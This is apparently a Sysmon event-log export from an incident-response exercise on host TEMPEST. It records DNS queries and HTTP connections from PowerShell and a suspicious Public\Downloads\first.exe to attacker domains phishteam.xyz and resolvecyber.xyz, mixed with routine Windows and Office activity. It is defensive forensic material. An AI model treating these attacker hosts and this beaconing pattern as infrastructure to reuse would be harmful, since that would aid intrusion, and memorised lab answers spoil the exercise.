438,7943,2022-06-20 17:17:38.7791374,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,7,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 7428, ProcessGUID: 4bbef3ae-abb0-62b0-aa0a-000000000700",RuleName: -,Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,QueryName: phishteam.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:c7bf;::ffff:167.71.199.191;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:03:35.409""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-abb0-62b0-aa0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""7428""},{""@Name"":""QueryName"",""#text"":""phishteam.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:c7bf;::ffff:167.71.199.191;""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
439,7944,2022-06-20 17:17:50.7352964,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 1688, ProcessGUID: 4bbef3ae-abbe-62b0-ab0a-000000000700",RuleName: -,"MD5=C4D2F9761675D6B5B02D1CA073DFA660,SHA256=D7B70975998DEF6E95897B615D8A981CDD8A1183C0B5EFCC5706758C53291553,IMPHASH=19C55DD8A167167BD60449F146E32AA6",ParentProcess: C:\Windows\System32\svchost.exe,"ParentProcessID: 1760, ParentProcessGUID: 4bbef3ae-8428-62b0-2f00-000000000700",ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,"""C:\Program Files\ruxim\ruximics.exe"" /nonetwork",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:50.732""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-abbe-62b0-ab0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""1688""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\ruxim\\RUXIMICS.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.19041.1019 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Reusable UX Interaction Manager""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""RUXIMICS.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Program Files\\ruxim\\ruximics.exe\"" /nonetwork""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Program Files\\ruxim\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-8422-62b0-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""MD5=C4D2F9761675D6B5B02D1CA073DFA660,SHA256=D7B70975998DEF6E95897B615D8A981CDD8A1183C0B5EFCC5706758C53291553,IMPHASH=19C55DD8A167167BD60449F146E32AA6""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-8428-62b0-2f00-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""1760""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
440,7945,2022-06-20 17:17:53.3584891,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,7,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: -,Image: C:\Users\Public\Downloads\first.exe,QueryName: resolvecyber.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:dea2;::ffff:167.71.222.162;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:03:50.970""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""QueryName"",""#text"":""resolvecyber.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:dea2;::ffff:167.71.222.162;""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
441,7946,2022-06-20 17:17:53.8726786,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,7,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: Usermode,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.222.162,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Usermode""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:03:51.018""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51959""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.222.162""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
442,7947,2022-06-20 17:17:53.8734169,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,7,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: Usermode,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.222.162,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Usermode""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:03:51.115""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51960""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.222.162""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
443,7948,2022-06-20 17:17:54.3566283,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,7,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: -,Image: C:\Users\Public\Downloads\first.exe,QueryName: resolvecyber.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:dea2;::ffff:167.71.222.162;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:03:51.071""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""QueryName"",""#text"":""resolvecyber.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:dea2;::ffff:167.71.222.162;""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
444,7949,2022-06-20 17:17:57.6239036,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 4600, ProcessGUID: 4bbef3ae-abc5-62b0-ac0a-000000000700",RuleName: -,"MD5=89D71B1EB7D0FBE4578655C4D230B8DD,SHA256=2E934019907CDEFC0E2EB87E81D21166B80FB565DD827A53F2E974B00AFDFC57,IMPHASH=E28C03509E7F23FEA2BCD7E77FF0B52B",ParentProcess: -,"ParentProcessID: 4452, ParentProcessGUID: 00000000-0000-0000-0000-000000000000",ParentCommandLine: -,"""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe5_ Global\UsGthrCtrlFltPipeMssGthrPipe5 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:57.622""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-abc5-62b0-ac0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4600""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\SearchProtocolHost.exe""},{""@Name"":""FileVersion"",""#text"":""7.0.17763.168 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Microsoft Windows Search Protocol Host""},{""@Name"":""Product"",""#text"":""Windows® Search""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""SearchProtocolHost.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\system32\\SearchProtocolHost.exe\"" Global\\UsGthrFltPipeMssGthrPipe5_ Global\\UsGthrCtrlFltPipeMssGthrPipe5 1 -2147483646 \""Software\\Microsoft\\Windows Search\"" \""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\"" \""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\"" \""DownLevelDaemon\"" ""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-8422-62b0-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""MD5=89D71B1EB7D0FBE4578655C4D230B8DD,SHA256=2E934019907CDEFC0E2EB87E81D21166B80FB565DD827A53F2E974B00AFDFC57,IMPHASH=E28C03509E7F23FEA2BCD7E77FF0B52B""},{""@Name"":""ParentProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ParentProcessId"",""#text"":""4452""},{""@Name"":""ParentImage"",""#text"":""-""},{""@Name"":""ParentCommandLine"",""#text"":""-""},{""@Name"":""ParentUser"",""#text"":""-""}]}}"
445,7950,2022-06-20 17:17:57.6578782,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 2476, ProcessGUID: 4bbef3ae-abc5-62b0-ad0a-000000000700",RuleName: -,"MD5=BE003A80F52A656CD0F58409101F8F3D,SHA256=8A9AF652092484AFAFFAD20DAFD51AE8886738C7432823549C4FB7FD06FCF7E3,IMPHASH=837968E736EE58A7F0780D1DA007BB63",ParentProcess: -,"ParentProcessID: 4452, ParentProcessGUID: 00000000-0000-0000-0000-000000000000",ParentCommandLine: -,"""C:\Windows\system32\SearchFilterHost.exe"" 0 780 784 792 8192 788 ",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:57.655""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-abc5-62b0-ad0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""2476""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\SearchFilterHost.exe""},{""@Name"":""FileVersion"",""#text"":""7.0.17763.168 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Microsoft Windows Search Filter Host""},{""@Name"":""Product"",""#text"":""Windows® Search""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""SearchFilterHost.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\system32\\SearchFilterHost.exe\"" 0 780 784 792 8192 788 ""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-8422-62b0-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=BE003A80F52A656CD0F58409101F8F3D,SHA256=8A9AF652092484AFAFFAD20DAFD51AE8886738C7432823549C4FB7FD06FCF7E3,IMPHASH=837968E736EE58A7F0780D1DA007BB63""},{""@Name"":""ParentProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ParentProcessId"",""#text"":""4452""},{""@Name"":""ParentImage"",""#text"":""-""},{""@Name"":""ParentCommandLine"",""#text"":""-""},{""@Name"":""ParentUser"",""#text"":""-""}]}}"
446,7951,2022-06-20 17:18:00.7942020,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,7,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: -,Image: C:\Users\Public\Downloads\first.exe,QueryName: resolvecyber.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:dea2;::ffff:167.71.222.162;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:03:58.397""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""QueryName"",""#text"":""resolvecyber.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:dea2;::ffff:167.71.222.162;""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
447,7952,2022-06-20 17:18:01.7944513,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,7,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: -,Image: C:\Users\Public\Downloads\first.exe,QueryName: resolvecyber.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:dea2;::ffff:167.71.222.162;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:03:58.499""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""QueryName"",""#text"":""resolvecyber.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:dea2;::ffff:167.71.222.162;""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
448,7953,2022-06-20 17:18:01.9191117,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,7,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: Usermode,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.222.162,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Usermode""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:03:58.443""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51961""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.222.162""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
449,7954,2022-06-20 17:18:01.9198290,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,7,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: Usermode,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.222.162,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Usermode""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:03:58.544""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51962""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.222.162""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
450,7955,2022-06-20 17:18:28.5149276,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,7,S-1-5-18,DNSEvent (DNS query),NT AUTHORITY\NETWORK SERVICE,,"ProcessID: 4964, ProcessGUID: 4bbef3ae-8433-62b0-6d00-000000000700",RuleName: -,Image: C:\Windows\System32\svchost.exe,QueryName: officecdn.microsoft.com.edgesuite.net,QueryStatus: 0,QueryResults: type:  5 officecdn.microsoft.com.edgesuite.net.globalredir.akadns.net;type:  5 a1737.dspw65.akamai.net;2001:fe0:10:68::125:4cc0;2001:fe0:10:68::125:4c9b;::ffff:1.37.77.24;::ffff:120.28.35.201;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:04:26.694""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-8433-62b0-6d00-000000000700""},{""@Name"":""ProcessId"",""#text"":""4964""},{""@Name"":""QueryName"",""#text"":""officecdn.microsoft.com.edgesuite.net""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""type:  5 officecdn.microsoft.com.edgesuite.net.globalredir.akadns.net;type:  5 a1737.dspw65.akamai.net;2001:fe0:10:68::125:4cc0;2001:fe0:10:68::125:4c9b;::ffff:1.37.77.24;::ffff:120.28.35.201;""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\NETWORK SERVICE""}]}}"
451,7956,2022-06-20 17:18:30.2452920,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 1316, ProcessGUID: 4bbef3ae-abac-62b0-a90a-000000000700",RuleName: EXE,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\Updates\16.0.15225.20288\OfficeClickToRun.exe,TargetFilename: C:\Program Files (x86)\Microsoft Office\Updates\Download\PackageFiles\8801DF78-4AAE-4735-B3E4-213DE154925A\root\Client\AppVDllSurrogate.exe,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:18:30.230""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-abac-62b0-a90a-000000000700""},{""@Name"":""ProcessId"",""#text"":""1316""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\16.0.15225.20288\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Updates\\Download\\PackageFiles\\8801DF78-4AAE-4735-B3E4-213DE154925A\\root\\Client\\AppVDllSurrogate.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:18:30.230""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
452,7957,2022-06-20 17:18:30.3154046,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 1316, ProcessGUID: 4bbef3ae-abac-62b0-a90a-000000000700",RuleName: EXE,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\Updates\16.0.15225.20288\OfficeClickToRun.exe,TargetFilename: C:\Program Files (x86)\Microsoft Office\Updates\Download\PackageFiles\8801DF78-4AAE-4735-B3E4-213DE154925A\root\Client\AppVDllSurrogate32.exe,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:18:30.308""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-abac-62b0-a90a-000000000700""},{""@Name"":""ProcessId"",""#text"":""1316""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\16.0.15225.20288\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Updates\\Download\\PackageFiles\\8801DF78-4AAE-4735-B3E4-213DE154925A\\root\\Client\\AppVDllSurrogate32.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:18:30.293""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
453,7958,2022-06-20 17:18:30.3487969,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 1316, ProcessGUID: 4bbef3ae-abac-62b0-a90a-000000000700",RuleName: EXE,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\Updates\16.0.15225.20288\OfficeClickToRun.exe,TargetFilename: C:\Program Files (x86)\Microsoft Office\Updates\Download\PackageFiles\8801DF78-4AAE-4735-B3E4-213DE154925A\root\Client\AppVDllSurrogate64.exe,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:18:30.340""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-abac-62b0-a90a-000000000700""},{""@Name"":""ProcessId"",""#text"":""1316""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\16.0.15225.20288\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Updates\\Download\\PackageFiles\\8801DF78-4AAE-4735-B3E4-213DE154925A\\root\\Client\\AppVDllSurrogate64.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:18:30.340""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
